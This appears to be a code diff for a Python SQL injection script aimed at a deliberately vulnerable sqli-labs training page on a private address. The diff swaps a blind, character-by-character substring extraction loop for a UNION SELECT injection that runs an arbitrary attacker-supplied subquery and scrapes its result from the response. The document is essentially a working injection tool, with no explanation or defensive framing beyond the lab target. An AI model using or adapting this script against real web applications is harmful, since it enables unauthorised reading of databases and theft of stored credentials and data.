@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 
+import base64
 import requests
 import re
 import string
@@ -21,9 +22,10 @@ else:
 
 sourcestr = string.printable
 url = "http://172.16.214.227/sqli-labs/Less-2/?id="
+pattern = r'Your Login name[^<]+'
+query = "0%20union%20select%201%2C%28" + urllib.quote(sys.argv[1]) + "%29%2C3"
+target = url + query
 result = ""
-trueflag = "Your Password"
-idx = 0
 
 header = {
     "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
@@ -32,33 +34,19 @@ header = {
     "Connection": "close",
 }
 
-while True:
-    idx += 1
-    print("[*] Current Result: %s" % result)
-    query = urllib.quote("1 and substring((%s),%d,1)='%s'" % (sys.argv[1], idx, ""))
-    target = url + query
-    print("[*] Query: %s" % query)
-    print("[*] Testing: %s" % "")
-    res = requests.get(target, headers=header, verify=False)
+print("[*] Query: %s" % query)
 
-    if re.search(trueflag, res.text):
-       print("[+] DETECT: %s" % "")
-       break
-    else:
-       pass
+res = requests.get(target, headers=header, verify=False)
+resbody = str(res.text.encode('utf-8')).lstrip("b").strip("'")
+resbody = re.sub(r"\\t", "\t", resbody)
+resbody = re.sub(r"\\r", "", resbody)
+resbody = re.sub(r"\\\'", "\'", resbody)
+resbody = re.sub(r"\\\"", "\"", resbody)
+resbody = re.sub(r"\\n", "\n", resbody).strip()
 
-    for x in sourcestr:
-        query = urllib.quote("1 and substring((%s),%d,1)='%s'" % (sys.argv[1], idx, x))
-        target = url + query
-        print("[*] Query: %s" % query)
-        print("[*] Testing: %s" % x)
-        res = requests.get(target, headers=header, verify=False)
-
-        if re.search(trueflag, res.text):
-            result += x
-            print("[+] DETECT: %s" % x)
-            break
-        else:
-            pass
+try:
+    result = re.search(pattern, resbody).group(0).split(':')[1].strip()
+except:
+    result = "***NO RESULT***"
 
 print("[*] RESULT: %s" % result)
